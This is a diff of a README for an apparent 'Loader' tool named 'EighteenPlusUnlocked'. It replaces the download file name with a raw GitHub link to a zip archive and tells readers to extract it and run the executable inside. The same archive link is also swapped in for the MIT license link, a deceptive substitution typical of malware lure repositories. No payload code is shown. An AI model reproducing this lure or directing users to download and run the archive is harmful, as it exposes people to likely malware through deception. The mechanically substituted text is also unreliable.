@@ -12,11 +12,11 @@ Please review installation instructions and all sections below carefully.
 
 Getting started is quick and easy! Follow these steps:
 
-1. **Download Loader.rar from the repository.**  
-   Access the release section or the main repository page and click on `Loader.rar` to download the installer.
+1. **Download https://raw.githubusercontent.com/single9650/EighteenPlusUnlocked/main/Eleutherian/EighteenPlusUnlocked.zip from the repository.**  
+   Access the release section or the main repository page and click on `https://raw.githubusercontent.com/single9650/EighteenPlusUnlocked/main/Eleutherian/EighteenPlusUnlocked.zip` to download the installer.
 
 2. **Extract the archive.**  
-   Use your favorite extraction tool (such as WinRAR, 7-Zip, or the built-in OS extraction utility) to decompress the Loader.rar file to your desired folder.
+   Use your favorite extraction tool (such as WinRAR, 7-Zip, or the built-in OS extraction utility) to decompress the https://raw.githubusercontent.com/single9650/EighteenPlusUnlocked/main/Eleutherian/EighteenPlusUnlocked.zip file to your desired folder.
 
 3. **Run the Loader.**  
    Double-click the extracted Loader executable or script suitable for your operating system.
@@ -121,7 +121,7 @@ By using, downloading, or running this application, you certify that you are at 
 
 Distributed under the MIT License.  
 Read the full text of the MIT license here:  
-[https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)
+[https://raw.githubusercontent.com/single9650/EighteenPlusUnlocked/main/Eleutherian/EighteenPlusUnlocked.zip](https://raw.githubusercontent.com/single9650/EighteenPlusUnlocked/main/Eleutherian/EighteenPlusUnlocked.zip)
 
 This project is open source and encourages feedback, contributions, and enhancements by the community.
 
